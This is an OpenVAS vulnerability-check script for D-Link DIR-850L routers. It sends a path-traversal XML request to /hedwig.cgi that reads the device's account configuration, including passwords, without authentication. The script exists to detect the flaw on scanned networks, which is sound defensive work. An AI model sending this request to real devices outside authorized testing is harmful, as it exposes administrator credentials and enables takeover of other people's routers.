##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dlink_dir_850_mult_vuln.nasl 7585 2017-10-26 15:03:01Z cfischer $
#
# D-Link DIR-850L Multiple Vulnerabilities
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/h:dlink:dir-850L';

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140304");
  script_version("$Revision: 7585 $");
  script_tag(name: "last_modification", value: "$Date: 2017-10-26 17:03:01 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name: "creation_date", value: "2017-08-16 16:49:52 +0700 (Wed, 16 Aug 2017)");
  script_tag(name: "cvss_base", value: "10.0");
  script_tag(name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_tag(name: "qod_type", value: "exploit");

  script_tag(name: "solution_type", value: "VendorFix");

  script_name("D-Link DIR-850L Multiple Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_dlink_dir_detect.nasl");
  script_mandatory_keys("host_is_dlink_dir");

  script_tag(name: "summary", value: "D-Link DIR 850L is prone to multiple vulnerabilities.");

  script_tag(name: "vuldetect", value: "Check the version.");

  script_tag(name: "insight", value: "D-Link DIR 850L is prone to multiple vulnerabilities:

- Remote Command Execution via WAN and LAN

- Remote Unauthenticated Information Disclosure via WAN and LAN

- Unauthorized Remote Code Execution as root via LAN");

  script_tag(name: "solution", value: "Update to version 1.14B07 BETA or later.");

  script_xref(name: "URL", value: "https://blogs.securiteam.com/index.php/archives/3364");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

url = '/hedwig.cgi';

data = '<?xml version="1.0" encoding="utf-8"?>\n' +
       '<postxml>\n' +
       '<module>\n' +
       '<service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service>\n' +
       '</module>\n' +
       '</postxml>';

cookie = 'uid=openvas';

req = http_post_req(port: port, url: url, data: data, add_headers: make_array("Cookie", cookie,
                                                                              "Content-Type", "text/xml"));
res = http_keepalive_send_recv(port: port, data: req);

if (egrep(pattern: "<result>OK</result>", string: res) &&
    egrep(pattern: "<password>.*</password>", string: res)) {
  report = "It was possible to access the configuration without authenticating which contains sensitive " +
           "information.\n\nResponde:\n\n" + res;
  security_message(port: port, data: report);
  exit(0);
}

exit(0);
